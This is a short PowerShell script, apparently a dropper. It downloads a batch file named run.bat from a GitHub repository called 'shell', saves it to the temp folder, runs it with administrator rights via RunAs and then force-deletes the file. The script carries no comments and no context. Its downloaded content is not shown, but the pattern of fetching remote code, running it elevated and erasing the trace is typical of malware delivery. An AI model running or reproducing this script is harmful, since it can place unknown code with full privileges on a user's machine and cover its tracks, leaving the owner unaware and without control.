$url = "https://raw.githubusercontent.com/0x2034/shell/main/run.bat"
$outputFile = "$env:TEMP\run.bat"
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile -Wait -Verb RunAs
Remove-Item -Path $outputFile -Force
